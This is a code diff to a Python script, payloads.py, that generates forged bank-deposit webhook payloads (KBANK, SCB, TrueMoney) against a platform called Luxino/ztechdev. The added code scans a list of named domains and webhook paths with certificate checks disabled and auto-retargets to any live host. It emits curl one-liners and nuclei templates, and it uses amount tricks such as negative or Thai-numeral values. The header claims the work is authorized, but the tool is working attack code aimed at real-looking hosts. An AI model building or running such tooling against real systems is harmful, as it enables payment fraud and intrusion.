@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 payloads.py — Luxino / ztechdev webhook injection payload generator
-Scope: bot-auto.ztechdev.com (authorized — scope.json)
+Scope: bot-auto.ztechdev.com + all in-scope platform domains (authorized — scope.json)
 
 Usage:
     uv run payloads.py              # generate all payloads, print summary
@@ -9,14 +9,20 @@ Usage:
     uv run payloads.py --curl       # print curl one-liners
     uv run payloads.py --nuclei     # write nuclei YAML template
     uv run payloads.py --out FILE   # save JSON to file
+    uv run payloads.py --scan       # probe all platform domains, print live hosts
+    uv run payloads.py --scan --curl  # scan then emit curl for first live host
 """
 import json
 import sys
 import time
+import socket
 import argparse
 import re
+import urllib.request
+import urllib.error
+import ssl
 from pathlib import Path
-from datetime import datetime
+from datetime import datetime, timezone
 
 # ── Target config ──────────────────────────────────────────────────────────
 C2_BASE = "https://bot-auto.ztechdev.com"
@@ -67,6 +73,91 @@ AMOUNT_VARIANTS = [
     ("unicode",   "๑๐๐.๐๐"),
     ("space",     " 100.00 "),
 ]
+
+# ── In-scope platform + tenant domains ────────────────────────────────────
+SCAN_TARGETS = [
+    "bot-auto.ztechdev.com",
+    "ztechdev.com",
+    "luxino.com",
+    "bot.luxino.com",
+    "bot-auto.luxino.com",
+    "staging-bot.luxino.com",
+    "vak88z3.com",
+    "we88z.plus",
+    "we88s.plus",
+    "asdgapicenterssdo.com",
+    "api.asdgapicenterssdo.com",
+    "sms.asdgapicenterssdo.com",
+    "deposit.asdgapicenterssdo.com",
+    "gateway.asdgapicenterssdo.com",
+    "we88zz.appspot.com",
+]
+
+PROBE_PATHS = [
+    "/public-health-check",
+    "/",
+    "/api",
+    "/service/authenticate",
+    "/webhooks/sms/truewallet",
+    "/webhook-kbank",
+    "/webhook-scb",
+    "/webhook-sms",
+    "/service/deposit/get-endpoint-webhook",
+]
+
+CTX = ssl.create_default_context()
+CTX.check_hostname = False
+CTX.verify_mode = ssl.CERT_NONE
+
+
+def _http_get(url: str, timeout: int = 5) -> tuple[int, str]:
+    try:
+        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
+            body = r.read(512).decode("utf-8", errors="replace")
+            return r.status, body
+    except urllib.error.HTTPError as e:
+        return e.code, ""
+    except Exception:
+        return 0, ""
+
+
+def _resolve(host: str) -> str:
+    try:
+        return socket.gethostbyname(host)
+    except Exception:
+        return ""
+
+
+def scan_domains(verbose: bool = False) -> list[dict]:
+    """Probe all in-scope domains. Returns list of live host records."""
+    print(f"{'─'*64}")
+    print(f"  {'HTTP':<6} {'IP':<16} {'DOMAIN'}")
+    print(f"{'─'*64}")
+
+    live = []
+    for host in SCAN_TARGETS:
+        ip = _resolve(host)
+        code, snippet = _http_get(f"https://{host}/")
+        status_str = str(code) if code else "000"
+        marker = "●" if code and 200 <= code < 400 else " "
+        print(f"{marker} {status_str:<6} {ip or 'no-dns':<16} {host}")
+
+        if code and code != 521:
+            rec = {"host": host, "ip": ip, "root_code": code, "paths": {}}
+            if verbose and code not in (0,):
+                for path in PROBE_PATHS:
+                    pc, ps = _http_get(f"https://{host}{path}")
+                    rec["paths"][path] = pc
+                    if pc:
+                        print(f"         {pc}  {path}")
+                time.sleep(0.1)
+            live.append(rec)
+
+    print(f"{'─'*64}")
+    print(f"Live hosts: {len(live)}")
+    return live
+
 
 # ── Static webhook key extraction ──────────────────────────────────────────
 def get_static_key() -> str:
@@ -227,13 +318,34 @@ def write_nuclei(payloads: list[dict], out: Path):
 def main():
     ap = argparse.ArgumentParser(description=__doc__,
                                   formatter_class=argparse.RawDescriptionHelpFormatter)
-    ap.add_argument("--json",   action="store_true", help="Dump payload set as JSON")
-    ap.add_argument("--curl",   action="store_true", help="Print curl one-liners")
-    ap.add_argument("--nuclei", action="store_true", help="Write nuclei YAML to lux_nuclei_webhook.yaml")
-    ap.add_argument("--out",    metavar="FILE",       help="Save JSON to file")
-    ap.add_argument("--filter", metavar="BANK",       help="Filter by bank (KBANK/SCB/KTB/TRUEMONEY)")
-    ap.add_argument("--amount", metavar="TYPE",       help="Filter by amount variant")
+    ap.add_argument("--json",    action="store_true", help="Dump payload set as JSON")
+    ap.add_argument("--curl",    action="store_true", help="Print curl one-liners")
+    ap.add_argument("--nuclei",  action="store_true", help="Write nuclei YAML to lux_nuclei_webhook.yaml")
+    ap.add_argument("--out",     metavar="FILE",       help="Save JSON to file")
+    ap.add_argument("--filter",  metavar="BANK",       help="Filter by bank (KBANK/SCB/KTB/TRUEMONEY)")
+    ap.add_argument("--amount",  metavar="TYPE",       help="Filter by amount variant")
+    ap.add_argument("--scan",    action="store_true", help="Probe all in-scope platform domains")
+    ap.add_argument("--verbose", action="store_true", help="With --scan: probe all paths on each live host")
+    ap.add_argument("--host",    metavar="HOST",       help="Override C2_BASE host for payload generation")
     args = ap.parse_args()
+
+    global C2_BASE
+    if args.host:
+        C2_BASE = f"https://{args.host}" if not args.host.startswith("http") else args.host
+
+    if args.scan:
+        live = scan_domains(verbose=args.verbose)
+        if live and not (args.curl or args.json or args.nuclei or args.out):
+            return
+        if live:
+            # Auto-retarget to first live non-original host if C2_BASE is still down
+            first = live[0]["host"]
+            if C2_BASE == "https://bot-auto.ztechdev.com":
+                C2_BASE = f"https://{first}"
+                print(f"\nAuto-retargeted → {C2_BASE}")
+        elif not live:
+            print("No live hosts found — exiting")
+            return
 
     payloads = build_payloads()
 
@@ -246,7 +358,7 @@ def main():
 
     if args.json or args.out:
         data = {
-            "generated":        datetime.utcnow().isoformat() + "Z",
+            "generated":        datetime.now(timezone.utc).isoformat(),
             "target":           C2_BASE,
             "static_key_found": key_found,
             "count":            len(payloads),
@@ -276,7 +388,7 @@ def main():
         by_ep[p["endpoint"]] = by_ep.get(p["endpoint"], 0) + 1
         by_bank[p["bank"]] = by_bank.get(p["bank"], 0) + 1
 
-    print(f"Luxino webhook payload generator — {datetime.utcnow().date()}")
+    print(f"Luxino webhook payload generator — {datetime.now(timezone.utc).date()}")
     print(f"Target  : {C2_BASE}")
     print(f"Key     : {'✓ found (PAPDIEAW-KEY extracted)' if key_found else '✗ not found — set PAPDIEAW_KEY env var'}")
     print(f"Payloads: {len(payloads)}")
@@ -290,7 +402,11 @@ def main():
         print(f"  {bank:<14} {n:>3}")
     print()
     print("Run with:")
-    print("  uv run payloads.py --curl             # curl one-liners")
+    print("  uv run payloads.py --scan             # probe all platform domains")
+    print("  uv run payloads.py --scan --verbose   # scan + path-probe each live host")
+    print("  uv run payloads.py --scan --curl      # scan then emit curl for live host")
+    print("  uv run payloads.py --host HOST --curl # target a specific host")
+    print("  uv run payloads.py --curl             # curl one-liners (current C2_BASE)")
     print("  uv run payloads.py --nuclei           # nuclei YAML template")
     print("  uv run payloads.py --out payloads.json")
     print("  uv run payloads.py --filter KBANK --amount negative")
